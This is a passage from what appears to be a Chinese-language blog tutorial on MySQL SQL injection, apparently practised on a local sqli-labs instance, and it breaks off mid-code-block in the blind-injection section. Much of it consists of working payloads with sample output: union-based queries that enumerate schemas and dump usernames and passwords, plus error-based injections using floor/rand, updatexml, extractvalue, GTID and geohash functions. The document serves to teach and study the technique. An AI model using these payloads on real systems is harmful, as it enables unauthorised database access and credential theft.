data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213193633629.png\" alt=\"image-20220213193633629\"></p>\n<h4 id=\"32sql注入定义\"><a class=\"markdownIt-Anchor\" href=\"#32sql注入定义\">#</a> 3.2SQL 注入定义</h4>\n<p>SQL Injection：就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>\n<p>本质因为输入的数据和代码不进行区分</p>\n<p>成因未对用户提交的参数数据进行校验或有效的过滤，直接进行 SQL 语句的拼接，改变了原有 SQL 语句的语义，传进数据库解析引擎中执行。</p>\n<p>所有的输入只要和数据库进行交互的，都有可能触发 SQL 注入</p>\n<p>常见的包括：</p>\n<p>Get 参数触发 SQL 注入</p>\n<p>POST 参数触发 SQL 注入</p>\n<p>Cookie 触发 SQL 注入</p>\n<p>其他参与 sql 执行的输入都有可能进行 SQL 注入</p>\n<p>两个条件</p>\n<p>用户能够控制输入</p>\n<p>原本程序要执行的 SQL 语句，拼接了用户输入的恶意数据</p>\n<h4 id=\"32mysql注入分类\"><a class=\"markdownIt-Anchor\" href=\"#32mysql注入分类\">#</a> 3.2mysql 注入分类</h4>\n<p>1. 按照请求方法注入</p>\n<p>​\tget 型注入</p>\n<p>​\tpost 型注入</p>\n<p>2. 按照 SQL 数据类型分类</p>\n<p>​\t整形注入</p>\n<p>​\t字符型注入</p>\n<p>3. 其他类型数据类型</p>\n<p>​\t报错注入</p>\n<p>​\t双注入</p>\n<p>​\t布尔盲注</p>\n<p>​\t时间盲注</p>\n<p>​\tCookie 注入</p>\n<p>​\tUser-Agent 注入</p>\n<p><strong>手工注入过程</strong></p>\n<p>1 判断是否存在注入点；</p>\n<p>2 判断字段长度（字段数）；</p>\n<p>3 判断字段回显位置；</p>\n<p>4 判断数据库信息；</p>\n<p>5 查找数据库名；</p>\n<p>6 查找数据库表；</p>\n<p>7 查找数据库表中所有字段以及字段值；</p>\n<p>8 猜解账号密码；</p>\n<p>9 登录管理员后台。</p>\n<h5 id=\"万能密码\"><a class=\"markdownIt-Anchor\" href=\"#万能密码\">#</a> 万能密码</h5>\n<p>select * from users where  username=&quot;&quot; or 1=1 --+</p>\n<p>通过 or 的 1=1 恒为真，密码被注释，此时相当于 select * from users;</p>\n<h5 id=\"1整形注入\"><a class=\"markdownIt-Anchor\" href=\"#1整形注入\">#</a> 1. 整形注入</h5>\n<p>1. 判断是否由注入 (是否未严格校验)— 第一要素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可控参数改变 (类似于?id=1,2,3,4) 能否影响页面结果</span><br><span class=\"line\">输入的SQL语句是否能报错，通过数据库报错看到数据库一些语句的痕迹</span><br><span class=\"line\">?id=1&#x27;   报错说明是整形注入 &#x27;</span><br><span class=\"line\">输入的SQL语句能否不报错，语句是否可以成功闭合</span><br><span class=\"line\">information_schema 包含当前数据库表名</span><br><span class=\"line\">tables 数据库中所有表，通过table_schema 和table_name 确定</span><br><span class=\"line\">通过union同时执行两条语句，但需要保证前一个表和后一个表字段数一样</span><br><span class=\"line\">因此需要判断前一个表有几列</span><br><span class=\"line\">通过#或者--+ 将后面的语句注释，使其只执行前面的语句，通过HTML实体编码将其编码#---%23</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3,4 #</span><br><span class=\"line\">如果提示有different columns，说明不匹配，可以使用枚举</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3 # </span><br><span class=\"line\">这里的1,2,3只是用于占位</span><br><span class=\"line\">将id改为前表不存在的值，使其查询结果不显示前表，同时可以查出回显位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,2,3 # </span><br><span class=\"line\">将后面占位符改为需要查询的语句，同时可以调换位置使其输出在正确的位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,user(),3 %23</span><br><span class=\"line\">寻找数据库名字</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,schema_name,3 from information_schema.schemata %23</span><br><span class=\"line\">此时只能查询出一条语句，可以使用group_concat()拼接不同列的数据</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata %23</span><br><span class=\"line\">查询当前数据库</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,database(),3  %23</span><br><span class=\"line\">查询当前数据有有哪些表，可以使用group_concat或concat,使用concat需要使用limit限制每次出数据的个数</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(table,name),3 from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\">查询表有哪些字段</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema = database() and table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">查询用户名密码</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(username),group_concat(password) from security.users %23</span><br><span class=\"line\">以human_read输出user_name和password</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(concat_ws(&#x27;:&#x27;,username,password)),3 from security.users %23</span><br></pre></td></tr></table></figure>\n<p>2. 什么类型注入</p>\n<p>3. 语句是否能够被恶意修改 — 第二要素</p>\n<p>4. 是否能够成功执行 — 第三要素</p>\n<p>5. 获取想要数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.判断是否是整形注入，即加&#x27;判断是否可以闭合&#x27;</span><br><span class=\"line\">2.判断输入是否可以影响输出 ?id=1 and 0  ?id=1 and 1 尝试使其不报错</span><br><span class=\"line\">3.判断表有几列 union select 1,2,3 %23 或者使用order by ，按照第x列排序，可以使用二分法依次查找列数</span><br><span class=\"line\">4.使用?id=1 and 0 union select 1,2,3 %23，其中1,2,3可以用需要查询的信息替换 database()</span><br><span class=\"line\">5.查询表的详细信息?id=1 and 0 union select 1,group_concat(table_name),3  from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>order by 探测列名原理：</strong></p>\n<p><strong>order by 后可以加列名，列号。比如 order by 3，按照第三列排序，因此如果第三列不存在会报错，我们可以利用这点探测列数</strong></p>\n<h5 id=\"字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#字符型注入\">#</a> 字符型注入</h5>\n<p>和数字型区别：接收的参数是否有’’ ,id='<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><msup><mi>d</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mtext>字符型，</mtext><mi>i</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">id&#x27;字符型，id=</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">字</span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">型</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span>id 数字型</p>\n<p>也可以通过报错信息查看，如果在 limit 附近报错，说明是数字型，如果在 $id 中报错说明是字符型，因为多了一个’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.使用order by判断列数</span><br><span class=\"line\">?id=1&#x27; order by 3 --+</span><br><span class=\"line\">2.使用联合查询</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select user()),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:root@localhost</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">3.查找数据库中有几张表</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">提示超出一行</span><br><span class=\"line\">可以使用limit 0,1，此时报出第一张表名</span><br><span class=\"line\">或者使用group_concat</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找列名</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:id,username,password</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找password</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),(select database()) --+</span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4</span><br><span class=\"line\">Your Password:security</span><br></pre></td></tr></table></figure>\n<p>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于：数字型不需要单引号闭合，而字符串类型一般要使用单引号来闭合。</p>\n<p>字符型：select * from table where username=‘test’</p>\n<p>字符型注入最关键的是如何闭合 SQL 语句以及注释多余的代码</p>\n<p>查询内容为字符串时：select * from table where username = ‘test’</p>\n<p>测试：</p>\n<p>select * from table where username = ‘test and 1=1’ ，无法注入，“test and 1=1” 会被数据库当作查询的字符串</p>\n<p>select * from table where username = ‘test’ and ‘1’='1’ --’，必须闭合字符串才可以继续注入</p>\n<h5 id=\"报错注入\"><a class=\"markdownIt-Anchor\" href=\"#报错注入\">#</a> 报错注入</h5>\n<p>查询错误会输出相应的错误，查询正确没有对应输出</p>\n<h6 id=\"1st_latfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#1st_latfromgeohashmysql57x\">#</a> 1.ST_LatFromGeoHash()（mysql&gt;=5.7.x）</h6>\n<p>计算纬度 hash 报错</p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LatFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">and ST_LatFromGeoHash(user())--+  //可以对于系统命令直接查询</span><br></pre></td></tr></table></figure>\n<h6 id=\"2st_longfromgeohashmysql57x\"><a class=\"markdownIt-Anchor\" href=\"#2st_longfromgeohashmysql57x\">#</a> 2.ST_LongFromGeoHash（mysql&gt;=5.7.x）</h6>\n<p>payload</p>\n<p>#同 8 ，都使用了嵌套查询</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">and ST_LongFromGeoHash(concat(0x7e,(select user()),0x7e))--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"3gtid-mysql-56x-显错200\"><a class=\"markdownIt-Anchor\" href=\"#3gtid-mysql-56x-显错200\">#</a> 3.GTID (MySQL&gt;= 5.6.X - 显错 &lt;=200)</h6>\n<p>0x01 GTID</p>\n<p>GTID 是 MySQL 数据库每次提交事务后生成的一个全局事务标识符，GTID 不仅在本服务器上是唯一的，其在复制拓扑中也是唯一的</p>\n<h6 id=\"gtid_subset-和-gtid_subtract函数\"><a class=\"markdownIt-Anchor\" href=\"#gtid_subset-和-gtid_subtract函数\">#</a> GTID_SUBSET () 和 GTID_SUBTRACT () 函数</h6>\n<p>0X02 函数详解</p>\n<p>GTID_SUBSET () 和 GTID_SUBTRACT () 函数，我们知道他的输入值是 GTIDset ，当输入有误时，就会报错</p>\n<p>GTID_SUBSET (set1 , set2) - 若在 set1 中的 GTID，也在 set2 中，返回 true，否则返回 false ( set1 是 set2 的子集)<br>\n GTID_SUBTRACT (set1 , set2) - 返回在 set1 中，不在 set2 中的 GTID 集合 ( set1 与 set2 的差集)</p>\n<p>0x03 注入过程 (payload)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GTID_SUBSET函数</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subset(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br><span class=\"line\"> </span><br><span class=\"line\">GTID_SUBTRACT</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;) or gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e),1)--+</span><br></pre></td></tr></table></figure>\n<p>函数都是那样，只是适用的版本不同</p>\n<h6 id=\"4floor8xmysql50\"><a class=\"markdownIt-Anchor\" href=\"#4floor8xmysql50\">#</a> 4.floor（8.x&gt;mysql&gt;5.0）</h6>\n<p>利用 select count (*),(floor (rand (0)*2)) x from table group by x，导致数据库报错，通过 concat 函数，连接注入语句与 floor (rand (0)*2) 函数，实现将注入结果与报错信息回显的注入方式。</p>\n<p>基本的查询 select 不必多说，剩下的几个关键字有 count 、group by 、floor、rand。</p>\n<p>1.rand () 函数，获取一个 0-1 之间的随机数</p>\n<p>但如果给一个固定的随机种子之后 rand (0), 每次产生的值都是一样的。也可以称之为伪随机（产生的数据都是可预知的）。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235308883-1871895582.png\" alt=\"img\"></p>\n<p>2.floor（rand（0）*2）函数</p>\n<p>floor () 函数的作用就是返回小于等于括号内该值的最大整数。</p>\n<p>而 rand () 是返回 0 到 1 之间的随机数，那么 floor（rand（0））产生的数就只是 0，这样就不能实现报错的：</p>\n<p>而 rand 产生的数乘 2 后自然是返回 0 到 2 之间的随机数，再配合 floor () 就可以产生确定的两个数了。也就是 0 和 1：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235309428-1152684208.png\" alt=\"img\"></p>\n<p>并且根据固定的随机数种子 0，他每次产生的随机数列都是相同的 0 1 1 0 1 1。</p>\n<p>3.group by 函数</p>\n<p>group by 主要用来对数据进行分组（相同的分为一组，显示相同组最前的 ID）。</p>\n<p>4.count（*）函数</p>\n<p>count（*）统计结果的记录数。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310739-413634853.png\" alt=\"img\"></p>\n<p>5. 综合使用产生报错：</p>\n<p>select count(*),floor(rand(0)*2) x from users group by x;</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235310997-244751856.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235310997-244751856.png\" alt=\"img\"></a></p>\n<p>根据前面函数，这句话就是统计后面产生随机数的种类并计算每种数量。</p>\n<p>分别产生 0 1 1 0 1 1 ，这样 0 是 2 个，1 是 4 个，但是最后却产生了报错。</p>\n<p><strong>三、报错分析</strong></p>\n<p>这个整合然后计数的过程中，中间发生了什么我们是必须要明白的。<br>\n首先 mysql 遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 key ，一个是计数值 count (<em>)。也就对应于实验中的 user_name 和 count (</em>)。<br>\n然后<strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加 1，不存在则新 建该分组。</strong></p>\n<p>然后 mysql 官方有给过提示，就是查询的时候如果使用 rand () 的话，该值会被计算多次，那这个 &quot;被计算多次&quot; 到底是什么意思，就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次，我们来看下 floor (rand (0)*2) 报错的过程就知道了，从上面的函数使用中可以看到在一次多记录的查询过程中 floor (rand (0)*2) 的值是定性的，为 011011 (这个顺序很重要)，报错实际上就是 floor (rand (0)*2) 被计算多次导致的，我们还原一下具体的查询过程：</p>\n<p>（1）查询前默认会建立空虚拟表如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311248-2120506620.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311248-2120506620.png\" alt=\"img\"></a></p>\n<p>（2）取第一条记录，执行 floor (rand (0)*2)，发现结果为 0 (第一次计算),</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311467-1420082064.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311467-1420082064.png\" alt=\"img\"></a></p>\n<p>（3）查询虚拟表，发现 0 的键值不存在，则插入新的键值的时候 floor (rand (0)*2) 会被再计算一次，结果为 1 (第二次计算)，插入虚表，这时第一条记录查询完毕，如下图:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311702-8360327.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311702-8360327.png\" alt=\"img\"></a></p>\n<p>（4）查询第二条记录，再次计算 floor (rand (0)*2)，发现结果为 1 (第三次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235311920-791381551.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235311920-791381551.png\" alt=\"img\"></a></p>\n<p>（5）查询虚表，发现 1 的键值存在，所以 floor (rand (0)<em> 2) 不会被计算第二次，直接 count (</em>) 加 1，第二条记录查询完毕，结果如下:</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312142-2071009941.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312142-2071009941.png\" alt=\"img\"></a></p>\n<p>（6）查询第三条记录，再次计算 floor (rand (0)*2)，发现结果为 0 (第 4 次计算)</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1835643/202004/1835643-20200428235312396-1593125203.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312396-1593125203.png\" alt=\"img\"></a></p>\n<p>（7）查询虚表，发现键值没有 0，则数据库尝试插入一条新的数据，在插入数据时 floor (rand (0)*2) 被再次计算，作为虚表的主键，其值为 1 (第 5 次计算)，</p>\n<p><a href=\"\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1835643-20200428235312660-1954097450.png\" alt=\"img\"></a></p>\n<p><strong>然而 1 这个主键已经存在于虚拟表中，而新计算的值也为 1 (主键键值必须唯一)，所以插入的时候就直接报错了。</strong></p>\n<p><strong>四、总结</strong></p>\n<p><strong>整个查询过程 floor (rand (0)*2) 被计算了 5 次，查询原数据表 3 次，所以这就是为什么数据表中需要最少 3 条数据，使用该语句才会报错的原因。</strong></p>\n<p>payload:</p>\n<p>#获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取当前数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>\n<p>#payload2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-1 union select count(*) from information_schema.tables group by concat(floor(rand(0)*2),database())</span><br></pre></td></tr></table></figure>\n<h6 id=\"5st_pointfromgeohash-mysql57\"><a class=\"markdownIt-Anchor\" href=\"#5st_pointfromgeohash-mysql57\">#</a> 5.ST_Pointfromgeohash (mysql&gt;=5.7)</h6>\n<p>获取数据库版本信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash(version(),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取表数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取 users 表里的段名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br></pre></td></tr></table></figure>\n<p>获取字段里面的数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage),0x23)),1)--+</span><br></pre></td></tr></table></figure>\n<h6 id=\"6-updatexml\"><a class=\"markdownIt-Anchor\" href=\"#6-updatexml\">#</a> 6 updatexml</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">updatexml(1,1,1) 一共可以接收三个参数，报错位置在第二个参数</span><br><span class=\"line\">updatexml(目标文档,xpath路径,更新内容)</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br><span class=\"line\">xpath syntax error:&#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，updatexml()能查询字符串的最大长度为32，</span><br><span class=\"line\">updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\">concat是针对以行数据做的拼接，而group_concat是针对列做的数据拼接，且group_concat自动生成逗号。</span><br><span class=\"line\">concat该函数主要针对一行数据中多个字段的拼接</span><br><span class=\"line\">group_concat该函数主要争对多行数据中[单个/多个]字段的拼接</span><br></pre></td></tr></table></figure>\n<h6 id=\"7-extractvalue\"><a class=\"markdownIt-Anchor\" href=\"#7-extractvalue\">#</a> 7 extractvalue</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extractvalue(1,1) 一共可以接收两个参数，报错位置在第二个参数</span><br><span class=\"line\">extravalue(xml标记片段,xpath表达式) 对xml文档在xpath路径进行查询的函数</span><br><span class=\"line\">报错时返回非法内容,即利用xpath路径错误报错</span><br><span class=\"line\"></span><br><span class=\"line\">extractvalue(1,concat(0x7e,(select user()),0x7e))--+</span><br><span class=\"line\">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32,就需要用substring()函数截取，一次查看32位,或者使用limit单次查询</span><br><span class=\"line\">and extractvalue(1,concat(0x7e,substring((select group_concat(username,&quot;:&quot;,password)from users),1,32),0x7e))--+</span><br></pre></td></tr></table></figure>\n<p>报错注入总结：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213222739771.png\" alt=\"image-20220213222739771\"></p>\n<h5 id=\"盲注\"><a class=\"markdownIt-Anchor\" href=\"#盲注\">#</a> 盲注</h5>\n<p>在 SQL 注入过程中，SQL 语句执行后，选择的数据不能回显到前端页面，此时需要利用一些</p>\n<p>方法进行判断或者尝试，这个过程称之为盲注。</p>\n<p>在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响 应时间不同）。一般情况下，盲注可分为两类：</p>\n<p>基于布尔的盲注（Boolean based）</p>\n<p>基于时间的盲注（Time based）</p>\n<p>1. 基于布尔的盲注</p>\n<p>某些场合下，页面返回的结果只有两种（正常或错误）。通过构造 SQL 判断语句，查看页 面的返回结果（True or False）来判断哪些 SQL 判断条件成立，通过此来获取数据库中的 数据。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span 